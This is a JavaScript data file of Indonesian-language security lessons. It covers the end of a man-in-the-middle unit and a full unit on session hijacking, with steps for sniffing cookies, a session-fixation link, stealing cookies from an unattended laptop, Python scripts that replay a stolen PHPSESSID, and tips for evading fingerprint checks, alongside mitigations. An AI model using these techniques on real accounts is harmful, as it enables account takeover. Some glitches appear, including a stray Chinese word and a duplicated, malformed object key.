      '🔰 Jalankan arp -a sebelum dan sesudah Bettercap ARP spoof. Apa yang berubah di ARP cache target?',
      '🔰 Tes Wireshark filter: filter hanya HTTP cookie di session lab. Berapa credential yang Anda tangkap?',
      '🟡 Coba MITM di HTTPS-only site — lihat SSL Strip gagal karena HSTS.',
      '🟡 Install Wireshark + buat trigger alert untuk cleartext password (regex).',
      '🔴 Setup ARP spoof detection dengan Wazuh / Suricata di lab kecil (2-3 VM).'
    ],
    faq: [
      { q: 'Apakah MITM hanya di WiFi?', a: 'Tidak. Bisa juga via: rogue WiFi hotspot, ARP spoof (wired), DNS hijack, BGP hijack (skala ISP), SSL stripping, malicious proxy. Semua jalur komunikasi bisa di-MITM.' },
      { q: 'Apakah HTTPS cukup aman dari MITM?', a: 'HTTPS dengan TLS valid sangat sulit di-MITM. Tapi ada edge case: (1) SSL Strip jika user klik "continue anyway" di warning, (2) Rogue CA certificate jika attacker install di sistem user, (3) Heartbleed / POODLE bugs lama.' },
      { q: 'Apakah VPN benar-benar aman?', a: 'VPN mengenkripsi traffic antara kamu ↔ VPN server. Setelah keluar dari VPN server, traffic mengikuti aturan internet biasa. Tapi VPN server JANGAN trusted secara buta — pilih provider yang tidak log.' },
      { q: 'Bagaimana cara trace siapa yang MITM saya?', a: 'Cek ARP table (perangkat tidak dikenal = suspicious), monitor Wireshark untuk traffic aneh, IDS seperti Suricata. Lapor ke admin jaringan jika di kantor.' }
    ],
    ringkasan: [
      'MITM = attacker di tengah komunikasi 2 pihak',
      'Teknik: ARP Spoof, DNS Spoof, SSL Strip, Rogue WiFi',
      'Tool: Bettercap (best all-in-one), Ettercap, cSploit Android',
      'Efek: password bocor, session di-hijack, traffic diubah diam-diam',
      'Lab: HANYA jaringan sendiri / lab resmi dengan izin',
      'Pertahanan utama: HTTPS + HSTS + Certificate Pinning + VPN',
      'Wajib VPN saat pakai WiFi publik'
    ],
    materiTerkait: ['WiFi Hacking', 'Session Hijacking', 'Enkripsi & Keamanan Data', 'Network Segmentation'],
  },
  20000, 30000, '🕵️', 'menengah', 'serangan', false
);

// =========== 8. SESSION HIJACKING ===========
f('🍪 Session Hijacking & Cookie Theft — Curi "Kunci" Agar Login Sebagai Korban',
  {
    tujuan: 'Paham konsep session HTTP, bagaimana cookie bisa dicuri via XSS/sniffing/fixation, dan cara login jadi user lain tanpa password pakai cookie curian. Serta cara防御 dengan HttpOnly, Secure, SameSite, regenerate session ID.',
    analogy: 'Bayangkan hotel pakai kunci magnetic card untuk kamar. Setelah check-in, kartu kamu = kunci. Security cuma cek kartu, tidak cek wajah. MITM/pencuri ngambil kartu dari saku celana kamu → masuk kamar sama sekali bebas. Session hijacking persis begitu: cookie session = "kunci magnetik" untuk login. Pencuri kopi cookie = langsung login sebagai korban.',
    pengertian: 'Session Hijacking adalah serangan di mana attacker mendapatkan session ID (biasanya berbentuk cookie) dari user yang sedang login. Setelah dapat session ID, attacker gunakan di browser sendiri → server mengira attacker = korban → attacker login TANPA password.<br/><br/>Ini lebih berbahaya dari password theft karena: bahkan dengan 2FA aktif, jika cookie session valid, attacker sudah login. 2FA biasanya hanya diminta saat LOGIN awal — setelah itu session yang dominan.',
    caraKerja: 'Cara pencurian session ID:<br/><br/>1) <strong>XSS</strong>: payload JS baca <code>document.cookie</code> + kirim ke attacker<br/>2) <strong>Sniffing di jaringan tidak terenkripsi</strong>: Wireshark filter <code>http.cookie</code><br/>3) <strong>Session Fixation</strong>: attacker set session ID tertentu di browser korban via link, korban login dengan session ID tsb → attacker gunakan SID yang sama<br/>4) <strong>Physical access</strong>: kalau bisa pegang laptop user (sebentar), buka DevTools → copy cookie session',
    asciiDiagram: `LOGIN NORMAL:
[User] login + password + OTP → server bikin SID → browser simpan SID

SESSION HIJACKING:
[Victim] login di website → cookie session ada di browser
[Attacker] curi cookie (XSS / snif / fixation)
[Attacker] paste cookie di browser sendiri → server cek cookie → valid!
[Attacker] ◄── lihat dashboard / lakukan aksi sebagai korban`,
    tools: {
      pc: 'Burp Suite (intercept), Wireshark, Cookie-Editor extension browser, Browser DevTools (F12).',
      hp: 'Termux + Python requests script, Firefox Android + Cookie Editor extension.'
    },
    prerequisites: [
      'Paham cookie HTTP & attribute (HttpOnly, Secure, SameSite)',
      'Sudah install Burp Suite',
      'Paham HTTP request/response',
    ],
    pcSteps: [
      { judul: 'Setup Burp + target latihan', isi: 'Buka Burp Suite. Login ke DVWA atau target latihan. Intercept request login. Perhatikan di response header: <code>Set-Cookie: PHPSESSID=abc123...</code>. Ini session ID kamu.' },
      { judul: 'Capture cookie via Burp', isi: 'Klik kanan request di Burp → "Copy as CURL command". ATAU lebih mudah: di tab "HTTP History", cari request yang ada cookie session — tampil cookie di header.' },
      { judul: 'Cara pakai cookie curian', isi: 'Buka Chrome incognito window. Install extension "Cookie-Editor". Buka DVWA URL. Buka DevTools (F12) → Application → Cookies → paste cookie hasil capture. Refresh. Kamu login sebagai korban tanpa password!' },
      { judul: 'Method 1: Sniff via Wireshark (jaringan tidak terenkripsi HTTP)', isi: 'Jalankan Wireshark di jaringan yang tidak HTTPS (HTTP only). Filter: <code>http.cookie</code>. Akan muncul semua cookie yang lewat. Cocok untuk situs lama tanpa HTTPS.' },
      { judul: 'Method 2: Tangani session fixation', isi: 'Session Fixation: attacker MASUKKIN session ID tertentu ke browser korban sebelum login. Cara: <code>target.com/login;PHPSESSID=ATTACKER_SID</code>. Korban buka link → login → server JANGAN regenerate SID setelah login → attacker pakai SID yang sama → login sebagai korban!' },
      { judul: 'Method 3: Physical access theft', isi: 'Kalau bisa pegang laptop user yang login (saat ditinggal), tekan F12 → Application → Cookies. Copy cookie. Paste di browser kamu. Logout user lain kalau perlu untuk tes (lab saja).' },
      { judul: 'Method 4: Automated via Python script', isi: 'Buat script Python: <pre><code>import requests\ncookie = {"PHPSESSID": "abc123cookie_curian"}\nr = requests.get("http://target.com/dashboard", cookies=cookie)\nif "Welcome" in r.text: print("HIJACKED! Login sebagai korban berhasil!")</code></pre>Mirip seperti di HP.' },
      { judul: 'Tes apakah target kamu vulnerable', isi: 'Cara cek apakah website lab rentan session hijacking:<br/>1) Login, copy cookie<br/>2) Logout<br/>3) Cookie masih valid? (paste ke incognito + buka dashboard tanpa login)<br/>4) Kalau masih bisa akses dashboard setelah logout = vulnerable (server tidak invalidate session on logout)<br/>5) Juga cek: apakah cookie baru dibuat setelah login? Kalau TIDAK = vulnerable fixation' }
    ],
    hpSteps: [
      { judul: 'Setup Termux + Python', isi: '<pre><code>pkg install python\npip install requests</code></pre>' },
      { judul: 'Script cek session hijacking', isi: 'Buat script: <code>cat &gt; hijack.py &lt;&lt;&lt; EOF\nimport requests\ncookie = {"PHPSESSID": "SID_CURIAN"}\nr = requests.get("http://target/dashboard", cookies=cookie)\nprint("Status:", r.status_code, "Length:", len(r.text))\nif "Logout" in r.text or "Welcome" in r.text:\n    print("🎉 HIJACKED!")\nEOF</code></pre>' },
      { judul: 'Firefox Android + Cookie Editor', isi: 'Install Firefox Android dari Play Store (Firefox support extension). Install extension "Cookie Editor". Login ke target di Firefox. Buka Cookie Editor → copy SEMUA cookie. Buka Firefox di HP kedua → paste cookie → akses target → login sebagai user pertama.' }
    ],
    bedahCommand: [
      {
        command: 'requests.get(URL, cookies={...})',
        penjelasan: [
          { flag: 'requests', arti: 'Library HTTP Python (pip install requests)' },
          { flag: '.get', arti: 'HTTP GET request ke URL' },
          { flag: 'url', arti: 'Alamat URL target' },
          { flag: 'cookies={}', arti: 'Dict Python berisi cookie name:value' }
        ]
      }
    ],
    troubleshooting: [
      { masalah: '❌ Cookie curian tidak bekerja', solusi: 'Cookie mungkin terkait IP strict-binding server (rare). Atau HttpOnly + Secure flag membuat cookie tidak bisa dipake di tempat lain. Coba pakai IP/network yang sama dengan korban.' },
      { masalah: '❌ "PHPSESSID" tidak dikenali', solusi: 'Session cookie name berbeda tiap framework. Bisa PHPSESSID, JSESSIONID, sessionId, token, dll. Cek header Set-Cookie di Burp.' },
      { masalah: '❌ Server detect session reuse', solusi: 'Server validasi fingerprint (IP, User-Agent, dll). Untuk lab yang punya proteksi ini, gunakan cara fixation dan cookie HttpOnly.' }
    ],
    mitigasi: 'Pertahanan dari Session Hijacking:<br/><br/>1) <strong>HttpOnly Cookie</strong>: cookie session diberi flag HttpOnly → JavaScript tidak bisa baca via document.cookie → XSS tidak bisa steal session.<br/>2) <strong>Secure Flag</strong>: cookie hanya dikirim via HTTPS, BUKAN HTTP. Kalau ada MITM, cookie tidak bocor di paket plain.<br/>3) <strong>SameSite=Strict/Lax</strong>: cookie tidak otomatis terkirim ke cross-site request → CSRF juga otomatis ter-block.<br/>4) <strong>Regenerate Session ID Setelah Login</strong>: server harus buat SID BARU setiap user login sukses. Mencegah fixation.<br/>5) <strong>Short Session Timeout</strong>: SID expire dalam 15-30 menit idle. Setelah logout, langsung invalidate.<br/>6) <strong>IP / User-Agent Binding</strong>: server cek apakah request datang dari IP & UA yang sama. Jika beda → invalidate session.<br/>7) <strong>Multi-Factor Re-Authentication</strong>: untuk aksi super sensitif (transfer, password change), minta user input password / OTP lagi.',
    latihan: [
      '🔰 Login ke DVWA, copy PHPSESSID, paste ke incognito window. Apakah session masih valid?',
      '🔰 Setup DVWA pakai cookie Secure flag. Lihat di DevTools apakah cookie terkirim via HTTP?',
      '🟡 Implementasikan session ID regeneration di lab: setelah login, SID harus beda.',
      '🟡 Sniff di lab yang ada HTTP non-HTTPS. Tangkap cookie yang lewat saat ada login.',
      '🔴 Pelajari CSRF token regeneration + double submit cookie pattern.'
    ],
    faq: [
      { q: 'Apakah sid berbeda dengan cookie?', a: 'Session ID biasanya disimpan sebagai cookie. Bisa juga di URL (?PHPSESSID=) atau hidden form field — semua itu SID. Cookie adalah mekanisme paling umum.' },
      { q: 'Apakah 2FA mencegah session hijacking?', a: 'Sebagian. 2FA biasanya hanya diminta saat LOGIN awal. Setelah login, session yang dominan. ATTACKER yang punya SID valid = otomatis login tanpa 2FA. Beberapa layanan 2FA setiap 24 jam, tapi banyak yang tidak.' },
      { q: 'Apakah logout selalu invalidate session?', a: 'Harusnya ya, tapi banyak website yang BUG: logout hanya hapus cookie di browser, tapi SID tetap valid di server. Selalu cek apakah SID invalid setelah logout.' },
      { q: 'Apakah ada cara cek apakah session saya di-hijack?', a: 'Cek "Active Sessions" di security setting banyak layanan (Google, Facebook). Lihat device & lokasi. Logout semua kecuali yang Anda kenali.' }
    ],
    ringkasan: [
      'Session Hijacking = pakai SID korban tanpa password',
      'Cara dapat SID: XSS, sniffing, fixation, physical access',
      'Setelah dapat SID: paste di browser/curl → login sebagai korban',
      'Tool: Burp Suite, Wireshark, Cookie-Editor, Python requests',
      'Defense utama: HttpOnly + Secure + SameSite + regenerate SID',
      '2FA tidak otomatis melindungi dari session hijacking',
      'Logout yang benar: invalidate SID di server, bukan hanya hapus cookie'
    ],
    materi Terkait: ['XSS', 'CSRF', 'Secure Coding'],
    materi Terkait: []
  }
);

